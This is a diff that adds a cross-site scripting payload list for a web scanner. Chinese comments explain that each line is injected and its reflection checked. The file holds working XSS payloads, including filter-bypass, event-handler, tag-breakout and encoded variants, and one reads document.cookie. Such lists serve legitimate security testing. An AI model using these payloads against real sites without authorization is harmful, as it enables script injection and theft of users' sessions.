@@ -1,0 +1,30 @@
+# XSS Payload Dictionary
+# 每行一个payload，扫描器将逐个尝试注入
+# 检测逻辑：注入后检查响应HTML中是否包含原样payload
+
+# === 基础弹窗型 ===
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<SCRIPT>alert(1)</SCRIPT>
+
+# === 绕过简单过滤 ===
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scri%00pt>alert(1)</scri%00pt>
+<ScRiPt>alert(1)</ScRiPt>
+
+# === 事件触发型 ===
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<details open ontoggle=alert(1)>
+
+# === 标签闭合型 ===
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+
+# === 编码绕过型 ===
+&#60;script&#62;alert(1)&#60;/script&#62;
+%3Cscript%3Ealert(1)%3C/script%3E
